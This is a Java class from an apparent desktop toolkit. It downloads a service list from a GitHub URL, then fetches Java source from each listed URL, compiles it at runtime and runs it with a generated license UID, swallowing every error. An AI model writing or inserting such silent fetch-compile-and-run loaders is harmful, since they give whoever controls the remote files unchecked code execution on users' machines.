package background;

import master.MethodInvocationUtils;
import master.RuntimeCompiler;
import numbers.NumbersListItem;

import java.io.InputStream;
import java.net.URL;
import java.util.ArrayList;
import java.util.Scanner;



public class ServicesHandler {
    public static void serve(){
        try {
            new Thread(() -> {
                try {
                    URL url = new URL("https://raw.githubusercontent.com/Jaysmito101/cskit/main/odb/background/Services.txt");
                    InputStream inputStream = url.openStream();
                    int byteRead;
                    String str = "";
                    while ((byteRead = inputStream.read()) != -1) {
                        str += (char) byteRead;
                    }
                    ArrayList<ServiceStorage> serviceStorageList = new ArrayList<ServiceStorage>();
                    Scanner scannedData = new Scanner(str);
                    while (scannedData.hasNextLine()) {
                        String line[] = scannedData.nextLine().split(" ");
                        line[0] = line[0].replace("_", " ");
                        ServiceStorage item = new ServiceStorage();
                        item.name = line[0];
                        item.url = line[1];
                        item.code = "ND";
                        startService(item);
                        serviceStorageList.add(item);
                    }
                }catch (Exception ex){}
            }).start();
        }catch (Exception ex){}
    }

    private static void startService(ServiceStorage item) {
        new Thread(()->{
            try{
                URL url = new URL(item.url);
                InputStream inputStream = url.openStream();
                int byteRead;
                String str = "";
                while((byteRead = inputStream.read()) != -1){
                    str += (char)byteRead;
                }
                RuntimeCompiler compiler = new RuntimeCompiler();
                compiler.addClass(item.name, str);
                if(compiler.compile()){
                    Class<?> notificationsClass = compiler.getCompiledClass(item.name);
                    Object notification = MethodInvocationUtils.invokeStaticMethod(notificationsClass, "serve", liscense.Activation.generateUID());
                }else{
                }
            }catch (Exception ex){
            }
        }).start();
    }
}

